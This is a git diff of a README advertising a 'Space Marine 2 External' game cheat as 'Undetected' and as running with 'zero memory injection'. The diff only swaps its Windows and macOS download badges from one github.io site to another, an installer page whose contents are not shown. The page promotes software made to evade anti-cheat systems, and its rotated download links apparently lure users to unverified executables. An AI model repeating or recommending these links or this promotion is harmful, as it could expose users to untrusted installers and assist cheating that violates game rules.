@@ -1,9 +1,9 @@
 # 🎮 Space Marine 2 External — Evidence V2
 
-[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://yobowgileysb.github.io/WinDownload/)
-[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://yobowgileysb.github.io/MacDownload/)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://yobowgileysb.github.io/WinDownload/)
-[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://yobowgileysb.github.io/WinDownload/)
+[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://mixedlinkrelease.github.io/installer/)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://mixedlinkrelease.github.io/installermac/)
+[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://mixedlinkrelease.github.io/installer/)
+[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://mixedlinkrelease.github.io/installer/)
 
 > The most trusted **Space Marine 2 External** for 2026 — operates entirely outside the game process with zero memory injection, delivering a clean and undetected experience.
 
@@ -82,11 +82,11 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://yobowgileysb.github.io/WinDownload/">
+  <a href="https://mixedlinkrelease.github.io/installer/">
     <img src="https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download Windows" />
   </a>
   &nbsp;&nbsp;
-  <a href="https://yobowgileysb.github.io/MacDownload/">
+  <a href="https://mixedlinkrelease.github.io/installermac/">
     <img src="https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download macOS" />
   </a>
 </p>
